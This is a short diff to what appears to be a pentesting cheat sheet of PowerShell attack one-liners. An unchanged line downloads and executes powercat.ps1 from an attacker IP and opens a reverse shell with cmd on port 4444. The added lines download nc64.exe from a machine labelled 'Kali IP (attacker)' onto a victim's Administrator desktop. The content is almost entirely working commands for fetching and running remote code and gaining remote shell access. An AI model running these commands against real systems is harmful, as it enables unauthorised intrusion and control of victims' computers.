@@ -38,3 +38,11 @@ Download[ powercat.ps1](https://raw.githubusercontent.com/besimorhino/powercat/m
 ```
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 4444 -e cmd"
 ```
+
+**Download file at Victim using PowerShell**
+
+Here, 10.10.16.3 is Kali IP (attacker) and -outf specifies the directory where to store file.
+
+```
+powershell -c iwr http://10.10.16.3/nc64.exe -outf \Users\Administrator\Desktop\nc64.exe
+```
